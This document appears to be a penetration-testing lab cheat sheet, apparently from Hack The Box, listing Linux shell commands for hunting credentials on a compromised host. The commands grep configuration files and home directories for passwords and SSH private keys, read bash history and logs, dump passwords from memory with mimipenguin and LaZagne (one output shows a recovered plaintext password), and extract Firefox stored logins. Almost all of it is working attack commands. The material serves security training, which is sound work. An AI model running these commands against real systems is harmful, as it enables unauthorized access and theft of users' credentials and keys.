#### Configuration Files

  Configuration Files

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
#### Credentials in Configuration Files

  Credentials in Configuration Files

```shell-session
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
#### Databases

  Databases

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
#### Notes

  Notes

```shell-session
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
#### Scripts

  Scripts

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
#### Cronjobs

  Cronjobs

```shell-session
cry0l1t3@unixclient:~$ cat /etc/crontab 
```

#### SSH Private Keys

  SSH Private Keys

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
#### SSH Public Keys

  SSH Public Keys

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### Bash History

  Bash History

```shell-session
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
```
#### Logs

```shell-session
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
#### Memory - Mimipenguin

  Memory - Mimipenguin

```shell-session
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
```
#### Memory - LaZagne

  Memory - LaZagne

```shell-session
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
```
#### Firefox Stored Credentials

  Firefox Stored Credentials

```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
```
```shell-session
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
```shell-session
Tachipy@htb[/htb]$ python3.9 firefox_decrypt.py
```
OR:
```shell-session
python3 laZagne.py browsers
```
